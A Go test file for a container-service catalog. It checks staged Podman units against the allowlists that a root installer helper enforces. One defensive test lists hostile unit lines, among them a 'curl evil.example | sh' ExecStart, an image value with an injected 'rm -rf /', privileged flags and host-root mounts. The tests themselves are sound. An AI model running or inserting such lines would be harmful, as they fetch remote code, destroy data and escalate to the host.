package services

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// The root helper in deploy/install.sh re-validates every staged unit line
// against three allowlists. These tests parse those very regexes out of the
// installer and run the catalog through them, so the catalog and the trust
// boundary cannot drift apart unnoticed: adding an image, volume or unit key
// without allowlisting it fails here instead of on a user's machine.

const installerPath = "../../deploy/install.sh"

func loadRE(t *testing.T, name string) *regexp.Regexp {
	t.Helper()
	b, err := os.ReadFile(installerPath)
	if err != nil {
		t.Fatalf("read installer: %v", err)
	}
	for _, line := range strings.Split(string(b), "\n") {
		if !strings.HasPrefix(line, name+"=") {
			continue
		}
		expr := strings.TrimPrefix(line, name+"=")
		expr = strings.TrimSpace(expr)
		expr = strings.TrimPrefix(expr, "'")
		expr = strings.TrimSuffix(expr, "'")
		re, err := regexp.Compile(expr)
		if err != nil {
			t.Fatalf("%s is not a valid regexp: %v", name, err)
		}
		return re
	}
	t.Fatalf("%s not found in %s", name, installerPath)
	return nil
}

// validateLine mirrors svc_validate_unit's case statement.
func validateLine(t *testing.T, line string, img, key, vol *regexp.Regexp) error {
	t.Helper()
	switch {
	case line == "" || strings.HasPrefix(line, "#"):
		return nil
	case strings.HasPrefix(line, "Image="):
		if !img.MatchString(line) {
			return fmt.Errorf("image not allowlisted: %s", line)
		}
	case strings.HasPrefix(line, "Volume="):
		if !vol.MatchString(line) {
			return fmt.Errorf("volume not allowed: %s", line)
		}
	case hasAnyPrefix(line, "PodmanArgs=", "Privileged=", "SecurityLabel", "Mount=", "HostDevice=", "AddCapability=", "User=", "Sysctl="):
		return fmt.Errorf("forbidden key: %s", line)
	default:
		if !key.MatchString(line) {
			return fmt.Errorf("unexpected line: %s", line)
		}
	}
	return nil
}

func hasAnyPrefix(s string, prefixes ...string) bool {
	for _, p := range prefixes {
		if strings.HasPrefix(s, p) {
			return true
		}
	}
	return false
}

func TestCatalogPassesRootHelperAllowlists(t *testing.T) {
	img := loadRE(t, "SVC_IMAGE_RE")
	key := loadRE(t, "SVC_KEY_RE")
	vol := loadRE(t, "SVC_VOL_RE")

	dir := t.TempDir()
	for _, s := range Catalog() {
		if s.Planned {
			continue
		}
		if err := Stage(dir, s, map[string]string{"EXTRA_ARGS": ""}); err != nil {
			t.Fatalf("%s: stage: %v", s.ID, err)
		}
		files, _ := filepath.Glob(filepath.Join(dir, "services-staging", s.ID, "*.container"))
		if len(files) == 0 {
			t.Errorf("%s: no .container unit staged", s.ID)
		}
		for _, f := range files {
			base := filepath.Base(f)
			// the helper enforces the unit naming scheme
			if !regexp.MustCompile(`^nodeos-svc-[a-z0-9-]+\.container$`).MatchString(base) {
				t.Errorf("%s: unit name %q would be rejected by the helper", s.ID, base)
			}
			b, err := os.ReadFile(f)
			if err != nil {
				t.Fatal(err)
			}
			if !strings.Contains(string(b), "Image=") {
				t.Errorf("%s/%s: helper requires an Image= line", s.ID, base)
			}
			for i, line := range strings.Split(strings.TrimRight(string(b), "\n"), "\n") {
				if err := validateLine(t, line, img, key, vol); err != nil {
					t.Errorf("%s/%s line %d rejected by the root helper: %v", s.ID, base, i+1, err)
				}
			}
		}
	}
}

// A hostile or buggy unit must be rejected by the same rules.
func TestAllowlistsRejectDangerousLines(t *testing.T) {
	img := loadRE(t, "SVC_IMAGE_RE")
	key := loadRE(t, "SVC_KEY_RE")
	vol := loadRE(t, "SVC_VOL_RE")

	bad := []string{
		"Image=docker.io/evil/miner:latest",
		"Image=docker.io/library/postgres:latest; rm -rf /",
		"Privileged=true",
		"PodmanArgs=--privileged",
		"Volume=/:/host",
		"Volume=/etc/bitcoin:/etc/bitcoin",
		"Volume=/var/lib/nodeos-services/../../../etc:/etc",
		"Mount=type=bind,source=/,destination=/host",
		"AddCapability=CAP_SYS_ADMIN",
		"User=root",
		"HostDevice=/dev/sda",
		// host-side execution must never pass as a container key
		"ExecStart=/bin/sh -c 'curl evil.example | sh'",
		"ExecStartPre=/bin/sh -c evil",
		"WantedBy=sysinit.target",
		"ContainerName=something-else",
		"Network=bridge",
		"Restart=on-abnormal",
	}
	for _, line := range bad {
		if err := validateLine(t, line, img, key, vol); err == nil {
			t.Errorf("dangerous line accepted: %q", line)
		}
	}
}

func TestStageSubstitutesAndClearsPlaceholders(t *testing.T) {
	dir := t.TempDir()
	s := ByID("lightning")
	if s == nil {
		t.Fatal("lightning service missing from the catalog")
	}
	if err := Stage(dir, s, map[string]string{"EXTRA_ARGS": "--announce-addr=1.2.3.4:9735 "}); err != nil {
		t.Fatal(err)
	}
	b, err := os.ReadFile(filepath.Join(dir, "services-staging", "lightning", "nodeos-svc-lightning.container"))
	if err != nil {
		t.Fatal(err)
	}
	got := string(b)
	if !strings.Contains(got, "--announce-addr=1.2.3.4:9735") {
		t.Error("caller parameter was not substituted")
	}
	// the RPC password is a root-side secret and must survive as a placeholder
	if !strings.Contains(got, "@@RPCPASS@@") {
		t.Error("@@RPCPASS@@ must stay for the root helper to substitute")
	}
	if strings.Contains(got, "@@EXTRA_ARGS@@") {
		t.Error("substituted placeholder still present")
	}

	// staging again with no params must clear unknown placeholders entirely
	if err := Stage(dir, s, nil); err != nil {
		t.Fatal(err)
	}
	b, _ = os.ReadFile(filepath.Join(dir, "services-staging", "lightning", "nodeos-svc-lightning.container"))
	got = string(b)
	if strings.Contains(got, "@@EXTRA_ARGS@@") {
		t.Error("unknown placeholder not cleared")
	}
	if !strings.Contains(got, "@@RPCPASS@@") {
		t.Error("@@RPCPASS@@ was cleared but must be kept")
	}
	if c := strings.Count(got, "@@"); c != 2 {
		t.Errorf("expected exactly the two @@RPCPASS@@ markers, found %d @@ tokens:\n%s", c, got)
	}
}

func TestStageRefusesPlannedServices(t *testing.T) {
	for _, s := range Catalog() {
		if !s.Planned {
			continue
		}
		if err := Stage(t.TempDir(), s, nil); err == nil {
			t.Errorf("%s is planned but staging was allowed", s.ID)
		}
	}
}

func TestCatalogIntegrity(t *testing.T) {
	ids := map[string]bool{}
	for _, s := range Catalog() {
		if ids[s.ID] {
			t.Errorf("duplicate service id %q", s.ID)
		}
		ids[s.ID] = true
		if !regexp.MustCompile(`^[a-z0-9-]{1,32}$`).MatchString(s.ID) {
			t.Errorf("id %q would be rejected by the root helper", s.ID)
		}
		if s.Name == "" || s.Tagline == "" {
			t.Errorf("%s: name/tagline must be set (they are user-facing)", s.ID)
		}
		if s.Planned {
			continue
		}
		if len(s.units) == 0 {
			t.Errorf("%s: installable service without units", s.ID)
		}
		for _, u := range s.UnitNames() {
			if !strings.HasSuffix(u, ".service") || !strings.HasPrefix(u, "nodeos-svc-") {
				t.Errorf("%s: derived unit name %q is wrong", s.ID, u)
			}
		}
	}
	if ByID("nonexistent") != nil {
		t.Error("ByID returned a service for an unknown id")
	}
}
